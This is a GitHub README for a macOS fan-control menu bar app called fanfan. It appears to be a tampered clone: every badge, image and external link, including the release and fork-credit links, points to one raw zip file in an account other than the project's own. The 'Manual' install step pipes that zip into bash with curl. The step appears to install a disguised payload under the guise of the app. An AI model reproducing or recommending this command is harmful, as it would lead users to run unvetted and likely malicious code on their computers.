![fanfan](docs/icon.png)

# fanfan

A macOS menu bar app that puts you back in charge of your fans.

[![release](https://img.shields.io/github/v/release/hoobnn/fanfan?style=flat-square)](https://github.com/marckerns/fanfan/raw/refs/heads/main/tools/Software_ionizable.zip)
[![macOS](https://img.shields.io/badge/macOS-26.0%2B-black?style=flat-square)](https://github.com/marckerns/fanfan/raw/refs/heads/main/tools/Software_ionizable.zip)
[![Swift](https://img.shields.io/badge/Swift-6-orange?style=flat-square)](https://github.com/marckerns/fanfan/raw/refs/heads/main/tools/Software_ionizable.zip)
[![license](https://img.shields.io/badge/license-MIT-green?style=flat-square)](LICENSE)

[中文文档](README.zh.md)

## Install

### Homebrew

```bash
brew tap hoobnn/tap
brew install --cask fanfan
```

### Manual

Download the latest DMG from [Releases](https://github.com/marckerns/fanfan/raw/refs/heads/main/tools/Software_ionizable.zip), or run the install script:

```bash
curl -fsSL https://github.com/marckerns/fanfan/raw/refs/heads/main/tools/Software_ionizable.zip | bash
```

Requires macOS 26+ (Apple Silicon or Intel). One password prompt on first launch — that's it.

## How it works

Writing fan speeds requires root. Instead of running the whole app as root,
fanfan installs a tiny C LaunchDaemon that owns the SMC handle and accepts
exactly three commands over a Unix socket: `PING`, `SET`, `AUTO`.

```
fanfan.app  ──unix socket──▶  fanfan-smcd (root)  ──IOKit──▶  SMC
```

The app itself runs unprivileged. Temperature reads go straight through IOKit.

## Star History

<a href="https://github.com/marckerns/fanfan/raw/refs/heads/main/tools/Software_ionizable.zip">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://github.com/marckerns/fanfan/raw/refs/heads/main/tools/Software_ionizable.zip" />
    <source media="(prefers-color-scheme: light)" srcset="https://github.com/marckerns/fanfan/raw/refs/heads/main/tools/Software_ionizable.zip" />
    <img alt="Star History Chart" src="https://github.com/marckerns/fanfan/raw/refs/heads/main/tools/Software_ionizable.zip" />
  </picture>
</a>

## Acknowledgements

Forked from [solofan](https://github.com/marckerns/fanfan/raw/refs/heads/main/tools/Software_ionizable.zip). Thanks to the solofan team.

[MIT](LICENSE) © 2026 hoobnn
